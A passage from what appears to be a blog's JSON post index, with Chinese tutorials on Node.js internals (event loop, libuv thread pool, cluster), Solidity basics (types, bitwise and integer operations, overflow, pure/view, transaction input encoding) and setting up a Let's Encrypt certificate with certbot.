前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[2]-Helloworld入门","slug":"node-2-Helloworld","date":"2018-11-12T16:51:44.000Z","updated":"2018-11-29T03:04:04.581Z","comments":true,"path":"2018/11/13/node-2-Helloworld/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-2-Helloworld/","excerpt":"","text":"nodejs helloworld 新建文件app.js： 12//打印字符串console.log('Start app.'); 打开控制台，在当前目录下输入： 1&gt; node app.js 输出字符串Start app. nodejs 复杂helloworld 12345678910111213141516//打印字符串console.log('Start app.');//导入node自带modules，fs文件操作const fs = require('fs');//os系统操作const os = require('os');//获取系统名字var user = os.userInfo();//添加字符串到回调函数中，并执行回调函数。出错就会报错，不出错就会打印出'The \"data to append\" was appended to file!'fs.appendFile('greetings.txt',`Hello $&#123;user.username&#125;`,(err) =&gt; &#123; if (err) throw err; console.log('The \"data to append\" was appended to file!');&#125;); 打开控制台，在当前目录下输入： 1&gt; node app.js 执行结果为，创建greetings.txt文件夹，并且添加了Hello jackson。","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"深度理解nodejs[4]-cluster多线程node","slug":"深度理解nodejs-4-cluster多线程node","date":"2018-11-10T11:57:57.000Z","updated":"2018-11-10T14:00:47.842Z","comments":true,"path":"2018/11/10/深度理解nodejs-4-cluster多线程node/","link":"","permalink":"https://dreamerjonson.com/2018/11/10/深度理解nodejs-4-cluster多线程node/","excerpt":"","text":"传统node单线程缺陷 下面的express程序可以看出nodejs单线程的缺陷，当访问主页面localhost:3000时，doWork(5000)方法会暂停5秒钟。 由于长时间的等待时间会使得node陷入到停顿的状态。当其他的请求来的时候，也只能够等待。例如当访问后立即访问localhost:3000/fast，只能够等待一段时间。 12345678910111213141516const express = require('express');const app = express();function doWork(duration)&#123; const start = Date.now(); while(Date.now()-start&lt;duration)&#123;&#125;&#125;app.get('/',(req,res)=&gt;&#123; doWork(5000); res.send(\"i like jonson\")&#125;)app.get('/fast',(req,res)=&gt;&#123; res.send(\"i like jonson\")&#125;)app.listen(3000); cluster多线程node增强node表现 使用nodejs内置的cluster module可以让多个node实例同时运行，管理多个node实例。 cluster管理多个node实例。cluster manager实例与child实例都会调用此文件中的代码。 通过cluster.isMaster将两者区分开。 cluster manager 中cluster.isMaster为true。 child实例实例中cluster.isMaster为false。 cluster.fork()代表新开一个child 实例。 下面的代码在一开始，cluster manager实例就新开了4个child 实例。 所以即便是一个child停顿不会影响其他child实例工作。 1234567891011121314151617181920212223242526const cluster = require(\"cluster\");if(cluster.isMaster)&#123; cluster.fork(); cluster.fork(); cluster.fork(); cluster.fork();&#125;else&#123; const express = require('express'); const app = express(); function doWork(duration)&#123; const start = Date.now(); while(Date.now()-start&lt;duration)&#123;&#125; &#125; app.get('/',(req,res)=&gt;&#123; doWork(5000); res.send(\"i like jonson\") &#125;) app.get('/fast',(req,res)=&gt;&#123; res.send(\"i like jonson\") &#125;) app.listen(3000);&#125; cluster缺陷 并不是cluster创建的child实数越多越好。因为cluster会让所有的请求都同时的结束。 想象一下我们fork了6个child，当6个请求来的时候，如果计算机没有这个处理能力，只能处理两个线程，但是6个请求又必须同时的时间结束，这反而拖慢了所有的速度。 这不如两个两个的执行好！","categories":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/tags/前端/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"solidity智能合约[8]-位运算与字面量","slug":"solidity-8","date":"2018-11-10T07:29:18.000Z","updated":"2018-11-20T16:37:46.932Z","comments":true,"path":"2018/11/10/solidity-8/","link":"","permalink":"https://dreamerjonson.com/2018/11/10/solidity-8/","excerpt":"","text":"位运算 solidity中，可以对于最底层的位进行操作。 由于以太坊中需要消耗gas，因此，为了节约gas、所以对于位的操作会用到比较频繁。 solidity中支持多种类型的位运算操作 1、位与 &amp; 2、位或 | 3、位异或 ^ 4、位取反 ~ 5、&lt;&lt; 6、&gt;&gt; 数字3、4的二进制表示 数字3、4的底层表示 位与 位与 位或 位或 位异或 位异或 位取反 位取反 位左移 位左移 位右移 位右移 位运算例子 123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.23;contract weiTest&#123; uint8 a = 3; uint8 b = 4; function weiyu() public view returns(uint8)&#123; return a &amp;b; &#125; function weihuo() public view returns(uint8)&#123; return a |b; &#125; function weiyihuo() public view returns(uint8)&#123; return a^b; &#125; function qufan() public view returns(uint8)&#123; return ~a; &#125; function leftMove() public view returns(uint8)&#123; return a&lt;&lt;1; &#125; function rightMove() public view returns(uint8)&#123; return a&gt;&gt;1; &#125;&#125; 整型字面量 solidity在计算过程中的中间值，支持任意的精度，如小数。不会发生溢出操作。 只有在将计算结果赋值给特定类型的时候，才会发生截断溢出等操作。 123456789101112131415//返回1function TestInterger() public pure returns(uint8)&#123; uint8 num = (2**800+1) - 2**800; return num; &#125;//返回50 function TestInterger2() public pure returns(uint8)&#123; uint8 num = 2/4*100; return num; &#125;//返回1 function TestInterger3() public pure returns(uint8)&#123; uint8 num =11111111111111111111111111111111111111111111112-11111111111111111111111111111111111111111111111; return num; &#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[7]-整型与运算","slug":"solidity-7","date":"2018-11-10T02:49:54.000Z","updated":"2018-11-20T16:37:50.635Z","comments":true,"path":"2018/11/10/solidity-7/","link":"","permalink":"https://dreamerjonson.com/2018/11/10/solidity-7/","excerpt":"","text":"整型变量 整数是现实中处理最多的单位，在solidity中的整数类型有int和uint，int类型可以存储负数，uint类型只能够存储非负数。 int类型：int8,int16,int24,int32…int256 uint类型：uint8,uint16,uint24,uint32…uint256 后面的数字代表的是计算机的最小存储单位：位。 1个字节代表8位。类型以一个字节递增，最大到256位，也就是32个字节。 int == int256 uint == uint256 整型运算 1、加 2、减 3、乘 4、除 5、取余数 6、平方 123456789101112131415161718192021222324//1、加function add(uint a,uint b) public pure returns(uint)&#123; return a+b; &#125; //2、减 function sub(uint a,uint b) public pure returns(uint)&#123; return a-b; &#125; //3、乘 function cheng(uint a,uint b) public pure returns(uint)&#123; return a*b; &#125; //4、除 function chu(uint a,uint b) public pure returns(uint)&#123; return a/b; &#125; //5、取余数 function yu(uint a,uint b) public pure returns(uint)&#123; return a%b; &#125;//6、平方 function pingfang(uint a,uint b) public pure returns(uint)&#123; return a**b; &#125; 整型溢出 整数如果处理不当，会发生溢出效应。如下面的函数overflow。 函数的功能为执行+1的操作。 当传递4、返回5. 传递200，返回201，但是当传递255的时候，会返回0，这是由于发生了溢出。 要理解溢出的本质，需要明白整型在计算机中的存储方式。 12345// 1111 1111//10000 0000function overflow(uint8 a) public pure returns(uint8)&#123; return a +1;&#125; 整型在底层的存储方式 计算机最小的存储单位为位，存储0或者1。 下面的图片描述了以位标示的二进制代码101转换为10进制后的计算方式。 底层存储方式 以此类推，可知道，uint8在内存中占8位，最大值为全部都存储1的时候，转换为10进制为255。 uint8最大值 当加一之后， 1111 1111 变为了 10000 0000 但是只能存储8位，所以截断之后，变为了 0000 0000 所以返回结果为0","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[6]-基本类型与bool运算","slug":"solidity-6","date":"2018-11-09T16:22:51.000Z","updated":"2018-11-20T16:37:54.328Z","comments":true,"path":"2018/11/10/solidity-6/","link":"","permalink":"https://dreamerjonson.com/2018/11/10/solidity-6/","excerpt":"","text":"变量 存储数据的抽象单位，代表内存中的一段空间。 类型 同其他的编程语言一样，solidity中也有许多基本的类型。类型决定了存储空间的大小和解析的方式。 下面列举出了solidity中基本的类型int、uint、byte、string、bool 基本类型 bool类型 这一小节中介绍基本的bool类型，bool类型只能够存储true或者false。 bool运算与运算符 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pragma solidity ^0.4.23;contract BooleanTest&#123; bool _a; int num1 = 100; int num2 = 200;//1、不赋初值的变量和默认返回false function getBool() public view returns(bool)&#123; return _a; &#125;//2、 返回true。 !运算符 将true变为false，false变为true function getBool2() public view returns(bool)&#123; return !_a; &#125;//3、==运算符，判断变量是否相同，相等为true，不等为false function equal() public view returns(bool)&#123; return num1==num2; &#125;//4、！=运算符，判断变量是否不同，相等为fasle，不等为true function equal2() public view returns(bool)&#123; return num1!=num2; &#125;//5、&amp;&amp; || 与或非的逻辑 function yu() public view returns(bool)&#123; return (num1==num2) &amp;&amp; true; &#125; function yu2() public view returns(bool)&#123; return (num1!=num2) &amp;&amp; true; &#125; function huo() public view returns(bool)&#123; return (num1==num2) || true; &#125; function huo2() public view returns(bool)&#123; return (num1==num2) || false; &#125;&#125; &amp;&amp; || 与或非的逻辑 1234567true &amp;&amp; false falsefalse &amp;&amp; true falsetrue &amp;&amp; true truetrue || false truefalse || true truefalse || false false 与或非","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[5]——一笔交易详解","slug":"solidity-5","date":"2018-11-09T12:46:26.000Z","updated":"2018-11-20T16:37:57.652Z","comments":true,"path":"2018/11/09/solidity-5/","link":"","permalink":"https://dreamerjonson.com/2018/11/09/solidity-5/","excerpt":"","text":"在之前,我们已经写好了一个最简单的helloworld合约,如下： 1234567891011121314151617pragma solidity ^0.4.23;contract HelloWorld&#123; string public name = \"jonson\"; function getName() public view returns(string)&#123; return name; &#125; function changeName(string _name) public&#123; name = _name; &#125; function testPure(uint a,uint b) public pure returns(uint)&#123; return a+b; &#125;&#125; 和pure和view不同，当我们执行changeName方法时，会发现，我们需要消耗gas。这笔事务会发送给全网所有的节点。全网所有的节点都会执行同样的操作。 当我们调用函数会在remix控制台中显示一些信息。 一笔交易的信息详解： 控制台信息 其中： 1、statues：代表当前交易状态，是否提交到区块链中成功。 2、transation hash:唯一标识此交易。 3、from:调用者地址。 4、to:合约地址 5、gas：此交易gas的最大限制 6、transation cost:此交易花费的总gas的大小。包含了excution cost。例如一笔交易基本的cost为21000gas。部署合约最小的成本为32000gas 7、excution cost：交易的执行成本。特指在以太坊虚拟机中运行的成本。 8、hash：同transation hash。 9、input 调用函数、传递进以太坊虚拟机中的二进制代码。 10、decode input 构造函数输入。 11、函数返回值 12、log 事件信息存储在其中 13、value 交易附带的以太币。 input详解 对于此例来说，如果我调用changeName传递的参数为&quot;olaya&quot;,那么input中的信息为： input 1、0x5353a2d8前4个字节，是函数声明hash后的前4个字节，用于查找到函数的位置。 2、0000000000000000000000000000000000000000000000000000000000000020第一个参数的偏移量，0x20是10进制的32，代表olaya这个参数偏移了32个字节。 3、0000000000000000000000000000000000000000000000000000000000000005string是特殊的动态长度数组，前面需要有长度来标示占了几个字节，扩充到32个字节。 4、6f6c617961000000000000000000000000000000000000000000000000000000olaya16进制标示，扩充到32个字节。。 参考资料： transation cost and excution cost","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[4]-pure与view剖析","slug":"solidity-4","date":"2018-11-09T09:46:32.000Z","updated":"2018-11-20T16:38:01.616Z","comments":true,"path":"2018/11/09/solidity-4/","link":"","permalink":"https://dreamerjonson.com/2018/11/09/solidity-4/","excerpt":"","text":"pure与view代码例子 如下的一段solidity智能合约中，只要有了pure与view修饰符的函数，那么调用函数就不会消耗gas。 而没有pure与view修饰的函数，如下面的change就会消耗gas。 12345678910111213141516171819pragma solidity ^0.4.23;contract HelloWorld&#123; string public name = \"jonson\"; function getName() public view returns(string)&#123; return name; &#125; function changeName(string _name) public&#123; name = _name; &#125; function testPure(uint a,uint b) public pure returns(uint)&#123; return a+b; &#125;&#125; pure与view使用场景 view: 可以自由调用，因为它只是“查看”区块链的状态而不改变它 pure: 也可以自由调用，既不读取也不写入区块链 pure与view原理 pure：不读取更不修改区块上的变量，使用本机的CPU资源计算我们的函数。所以不消耗任何的资源这是很容易的理解的。 view: 但是view既然要读取区块链上的值，为什么也不用消耗gas呢？😃 其实很简单，因为作为一个全节点来说，会同步保存所有的信息，保存在本地中。 那么我们要查看区块链上的资源，同样可以直接在一个全节点之上查询数据即可。 我不需要全世界的节点都知道。都去同时的处理这笔事务。我也不需要将调用这笔函数的信息记录在区块链上。 所以view仍然不消耗gas。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[3]-代码结构","slug":"solidity-3-","date":"2018-11-09T09:19:45.000Z","updated":"2018-11-20T16:38:05.186Z","comments":true,"path":"2018/11/09/solidity-3-/","link":"","permalink":"https://dreamerjonson.com/2018/11/09/solidity-3-/","excerpt":"","text":"合约结构 1、明确solidity的版本号。 此行意味着我们正在阻止我们的程序被一个比0.4.0更老的编译器编译^表示向上兼容，但是不能够被0.5.0及其以上的编译器编译。 我们这样做是为了尽量减少代码以意想不到或不兼容的方式编译时可能发生的错误的风险。 2、定义一个合约，内部有不同的方法和属性。 描述一个对象，可以从属性和行为两个方面，这正是面向对象的重要特征。 3、在合约的内部声明变量的方法和属性。 4、定义不同的函数、属于不同的函数成员。 代码结构 函数的一般形式 1function (&lt;parameter types&gt;) &#123;public|internal|external&#125; [pure|constant|view|payable] [returns (&lt;return types&gt;)] function 函数修饰符 public：任何人都可以调用该函数，包括DApp的使用者。 private：只有合约本身可以调用该函数（在另一个函数中）。 internal：只有这份合同以及由此产生的所有合同才能称之为合同。 external：只有外部可以调用该函数，而合约内部不能调用。 view: 可以自由调用，因为它只是“查看”区块链的状态而不改变它 pure: 也可以自由调用，既不读取也不写入区块链 payable:常常用于将代币发送给合约地址。 修饰符","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"深度理解nodejs[3]—疯狂事件代码","slug":"深度理解nodejs-3-—疯狂事件代码","date":"2018-11-09T05:14:16.000Z","updated":"2018-11-09T05:28:08.781Z","comments":true,"path":"2018/11/09/深度理解nodejs-3-—疯狂事件代码/","link":"","permalink":"https://dreamerjonson.com/2018/11/09/深度理解nodejs-3-—疯狂事件代码/","excerpt":"","text":"疯狂的代码。 下面这段疯狂的代码，你能知道它输出什么结果吗？ 123456789101112131415161718192021222324252627282930const https = require('https');const start = Date.now();const fs = require('fs');const crypto = require('crypto');function dorequest()&#123; https.request('https://www.baidu.com',res=&gt;&#123; res.on('data',()=&gt;&#123;&#125;); res.on('end',()=&gt;&#123; console.log(Date.now()-start); &#125;); &#125;) .end();&#125;function dohash()&#123; crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('hash:',Date.now()-start); &#125;);&#125;dorequest();fs.readFile('test.js','utf8',()=&gt;&#123; console.log('FS:',Date.now()-start);&#125;);dohash();dohash();dohash();dohash(); 测试速度： 12345642hash: 785FS: 785hash: 788hash: 790hash: 790 解释： https不依靠libuv库的4个默认线程，操作系统资源。其第一个最快的执行完毕 FS和pbkdf2都使用了libuv中的线程池 一开始FS与三个pbkdf2抢占了libuv线程池的4个线程，但是由于FS读取文件，中断操作。libuv将线程切换到执行最后一个pbkdf2函数。 等到某一个pbkdf2函数执行完毕后，则继续执行FS函数，所以看到了上面的结果。","categories":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/tags/前端/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"深度理解nodejs[2]-事件循环","slug":"深度理解nodejs-2","date":"2018-11-09T01:07:15.000Z","updated":"2018-11-09T05:33:06.264Z","comments":true,"path":"2018/11/09/深度理解nodejs-2/","link":"","permalink":"https://dreamerjonson.com/2018/11/09/深度理解nodejs-2/","excerpt":"","text":"进程与线程 我们在电脑中会运行多个程序，每一个程序中都会有多个线程。 例如我们运行比特币客户端的时候，我们某一个线程要处理网络、某一个线程要处理挖矿、某一个线程要处理用户输入… 线程的调度使用了操作系统级别的调度器来明确了哪一个线程应该被执行。线程也有优先级之分，例如监听鼠标滑动的优先级就会很高，因为其不能等待太长的时间。 为了在给定的时间内更快更多的处理线程： 1、我们可以通过增加CPU的核心数量或者是 2、调度器当监测到线程中运行中断，如读取文件网络时，及时切换到其他的线程中执行。 事件循环 nodejs是单线程的事件循环机制 伪代码演示事件循环： 123456789101112131415161718192021222324const peningTimers =[];const pendingOSTasks=[];cosnt pendingOperations=[];1、初始化myfile.runContent()function shouldContinue()&#123; //是否继续 1、检查setTimeOut、setInterval、setImmediate 2、检查是否有监听端口等操作系统级别的任务 3、检查是否有文件、网络等长期的操作return peningTimers.length || pendingOSTasks.length || pendingOperations.length;&#125;2、事件循环while(shouldContinue())&#123;//1.观察peningTimers.length，是否调查setTimeOut、setInterval等函数//2、观察pendingOSTasks.length pendingOperations.length，并调用相关回调函数//3.暂停、一直等到上面的某一个事件完成//4、调用setImmediate等函数//5、处理close事件&#125;3、退出 nodejs的单线程与多线程 nodejs的单线程，是对于其处理事件循环来讲的，有了事件触发，就会执行相应函数。没有事件触发，就会等待。从这个意义上来说，nodejs是单线程的。 但是在处理具体的任务，函数的时候。nodejs确是多线程的。 nodejs的单线程与多线程证明 1234567const crypto = require('crypto');const start = Date.now();crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('1:',Date.now()-start);&#125;); 测试pbkdf2速度：1: 868 1234567891011const crypto = require('crypto');const start = Date.now();crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('1:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('2:',Date.now()-start);&#125;); 测试pbkdf2速度: 121: 8912: 893 说明了pbkdf2函数是多线程来执行的。libuv中默认有4个线程，pbkdf2函数正是借助libuv实现了多线程。 测试libuv中默认有4个线程 12345678910111213141516171819const crypto = require('crypto');const start = Date.now();crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('1:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('2:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('3:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('4:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('5:',Date.now()-start);&#125;); 123454: 9191: 9223: 9362: 9365: 1813 注意，明显第5个线程时间增加了一倍，因为默认libuv中默认有4个线程，第5个线程陷入了等待。 修改libuv中默认默认线程 123456789101112131415161718192021process.env.UV_THREADPOOL_SIZE = 5;const crypto = require('crypto');const start = Date.now();crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('1:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('2:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('3:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('4:',Date.now()-start);&#125;);crypto.pbkdf2('a','b',100000,512,'sha512',()=&gt;&#123; console.log('5:',Date.now()-start);&#125;); 测试速度： 123451: 9565: 9633: 9702: 9714: 974 http库 123456789101112131415161718192021const https = require(&apos;https&apos;);const start = Date.now();function dorequest()&#123; https.request(&apos;https://www.baidu.com&apos;,res=&gt;&#123; res.on(&apos;data&apos;,()=&gt;&#123;&#125;); res.on(&apos;end&apos;,()=&gt;&#123; console.log(Date.now()-start); &#125;); &#125;) .end();&#125;dorequest();dorequest();dorequest();dorequest();dorequest();dorequest();dorequest();dorequest();dorequest(); 测试速度： 123456789485052535455575862 https网络访问，调用了操作系统资源，libuv只是起到了代理的作用，所以不收到libuv默认4个线程的限制。 总结 pbkdf2等函数是借助libuv实现多线程的。但是当这些函数执行完毕后，会触发完成事件.nodejs主线程触发事件的处理却是单线程的。","categories":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/tags/前端/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"深度理解nodejs[1]-node底层机制","slug":"深度理解nodejs","date":"2018-11-08T15:17:47.000Z","updated":"2018-11-13T09:50:42.020Z","comments":true,"path":"2018/11/08/深度理解nodejs/","link":"","permalink":"https://dreamerjonson.com/2018/11/08/深度理解nodejs/","excerpt":"","text":"nodejs作为javascript在后端运行的环境，源码由js与C完成。本质上，nodejs是借助于谷歌V8引擎来运行javascript代码。使用了C的libuv库来处理网络，访问文件系统等操作。 nodejs的作用 1、提供一种接口，仅仅书写javascript的代码，就可以让他们正确执行，不用书写C++代码。 2、丰富的api。http、fs、path、crypto …modules nodejs源码 nodejs源码： https://github.com/nodejs/node lib:nodejs库函数 src:库函数的C++实现。 pbkdf2中js代码 pbkdf2函数的实现：node/lib/internal/crypto/pbkdf2.js 123456789101112function pbkdf2(password, salt, iterations, keylen, digest, callback) &#123; ... handleError(keybuf, password, salt, iterations, digest, wrap);&#125;调用了：const rc = _pbkdf2(keybuf, password, salt, iterations, digest, wrap);_pbkdf2绑定了C++函数的实现。const &#123; pbkdf2: _pbkdf2 &#125; = internalBinding('crypto'); internalBinding链接javascript代码与C++代码。 pbkdf2中c++代码 crypto库源代码实现：node/src/node_crypto.cc 12345678910111213绑定 env-&gt;SetMethod(target, \"pbkdf2\", PBKDF2); inline void PBKDF2(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; ... job-&gt;iteration_count = args[3].As&lt;Uint32&gt;()-&gt;Value(); Utf8Value digest_name(args.GetIsolate(), args[4]); job-&gt;digest = EVP_get_digestbyname(*digest_name); if (job-&gt;digest == nullptr) return rv.Set(-1); if (args[5]-&gt;IsObject()) return PBKDF2Job::Run(std::move(job), args[5]); env-&gt;PrintSyncTrace(); job-&gt;DoThreadPoolWork(); rv.Set(job-&gt;ToResult()); &#125; v8 node/src/node_crypto.cc中我们还会看到很多的v8,将javascript类型转换为c++类型 123456 using v8::Array; using v8::Boolean; using v8::ConstructorBehavior; using v8::Context; using v8::DontDelete;... libuv node/src/node_crypto.cc中我们还会看到很多的libuv，处理并发操作。 123...static uv_once_t init_once = UV_ONCE_INIT;uv_once(&amp;init_once, InitCryptoOnce);","categories":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/tags/前端/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"添加网站https的证书","slug":"添加网站https的证书","date":"2018-11-07T15:31:45.000Z","updated":"2018-11-07T16:05:52.931Z","comments":true,"path":"2018/11/07/添加网站https的证书/","link":"","permalink":"https://dreamerjonson.com/2018/11/07/添加网站https的证书/","excerpt":"","text":"准备工作 首先有一个linux虚拟机 12345$ apt-get install letsencrypt$ apt-get install python-pip$ pip install --upgrade pip$ pip install certbot$ certbot certonly --manual --preferred-challenges dns --email foo@bar.com --domains test001.bar.com 执行成功后 123Please deploy a DNS TXT record under the name_acme-challenge.erpnext.xyz with the following value:J50GNXkhGmKCfn-0LQJcknVGtPEAQ_U_WajcLXgqWqo 产生key-value对，添加dns中(Create TXT record via DNS console and setup key and value): Record Name: acme-challenge.erpnext.xyz Record Value: J50GNXkhGmKCfn-0LQJcknVGtPEAQ_U_WajcLXgqWqo 点击继续，出现下面的提示，导出证书成功： 12345IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/nova.moe/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/nova.moe/privkey.pem 创建google Cloud load balancing 谷歌云负载平衡 添加google Cloud load balancing https负载， 后端服务器连接到网页存储的cloud storage中。 前端配置https，导入证书。 如果希望https和hhtp都可用，可以让此ip分别监听80和443两个端口，同时早域名商中，添加域名到ip的链接。 参考资料 使用 Google Cloud Platform 的 Storage 托管静态站点并通过 Google CDN 加速 Generate Wildcard SSL certificate using Let’s Encrypt/Certbot Letsencrypt how to use preferred-challenges cloud google load balancing How to Setup a SSL for Google Cloud Storage hosted Site? Google Cloud Load Balancer redirect HTTP to HTTPS","categories":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/categories/server/"}],"tags":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/tags/server/"}]},{"title":"solidity智能合约[2]-helloworld","slug":"solidity-2-helloworld","date":"2018-11-07T14:57:01.000Z","updated":"2018-11-20T16:38:18.592Z","comments":true,"path":"2018/11/07/solidity-2-helloworld/","link":"","permalink":"https://dreamerjonson.com/2018/11/07/solidity-2-helloworld/","excerpt":"","text":"运行你的合约 现在编译完全顺利，请转到“run”选项卡，以便我们可以运行我们的合约！ compile 在这里，您可以指定一些选项来创建合约，例如，选择哪个地址部署它。 现在我们不会混淆这些设置。只要确保环境设置为“JavaScript VM”，然后点击粉红色的“Deploy”按钮即可。 deploy 消息日志不多，但意味着将你的合同部署到了以太坊地址（尽管只在虚拟环境中）！ 部署合同也使用Gas，并花费一定的以太币。这就是为什么，如果你检查选项中的账户地址，你的余额应该从100以太币略微下降到接近99。 ether 减少 现在HelloWorld合约已启动并正在运行，只需按下浏览器窗口中的蓝色按钮 “getIt” ，即可调用其getIt函数。 solidity 正如你看到的，日志系统中详细记录了调用的详情： 另外要注意的是，你的账户中的以太币并没有发生变化，因为他只是一个“view”函数。 log 添加一个可写入的函数 到目前为止一切顺利，但我们真正想要做的是让任何人将名称变量改为别的。为此，我们将添加一个新的changeIt函数。 12345678910pragma solidity ^0.4.0;contract HelloWorld &#123; // ... function changeIt(string _newString) public &#123; firstTest= _ newString; &#125;&#125; 正如你所看到的，这个函数在几个方面与getIt不同。它并没有使用视图修改，因为它实际上改变了存储在blockchain数据，也不会返回任何东西。 Solidity函数中的参数通常以下划线（_）作为前缀，以将其与全局状态变量（如firstTest）区分开来。我们将在整个课程中采用这一惯例。 再次运行 我们再次单击“deploy”按钮来重新部署我们的合同。 change 注意新的“changeIt”按钮是粉红色而不是蓝色，以强调它是可写入函数的事实。 您现在应该可以在输入字段中键入新名称（不要忘记在名称周围添加双引号），单击“changeIt”按钮并通过单击“getIt”来获取它。 complete 恭喜！你已经完成了第一个solidity的智能合约。获取和设置不同类型的状态变量我们将在后续反复使用。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity[1]-HelloWorld","slug":"solidity-HelloWorld","date":"2018-11-04T12:31:15.000Z","updated":"2018-12-02T02:06:51.677Z","comments":true,"path":"2018/11/04/solidity-HelloWorld/","link":"","permalink":"https://dreamerjonson.com/2018/11/04/solidity-HelloWorld/","excerpt":"","text":"solidity介绍 以太坊拥有多种高级语言，可用于编写智能合约，每种语言都受到另一种广泛使用的语言的启发。最流行的一种叫做Solidity，它基于JavaScript。由于Solidity是迄今为止最成熟的以太坊语言，因此它是社区大力鼓励开发人员现在使用的语言。 Solidity与其它语言相关的特点？ 